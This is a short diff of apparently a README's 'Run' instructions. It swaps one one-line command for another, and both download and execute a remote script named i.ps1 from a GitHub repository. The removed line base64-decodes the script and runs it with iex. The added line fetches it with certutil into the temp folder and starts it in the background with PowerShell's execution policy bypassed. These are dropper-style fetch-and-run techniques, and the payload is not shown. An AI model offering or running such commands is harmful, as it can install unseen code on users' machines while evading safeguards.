@@ -2,5 +2,5 @@
 
 Run:
 ```powershell
-powershell -Command "iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((irm https://raw.githubusercontent.com/MitrichevGeorge/myusb/main/i.ps1))))"
+cmd /c "certutil -urlcache -split -f https://raw.githubusercontent.com/MitrichevGeorge/myusb/main/i.ps1 %temp%\i.ps1 & start /b powershell -ExecutionPolicy Bypass -NoProfile -File %temp%\i.ps1"
 ```
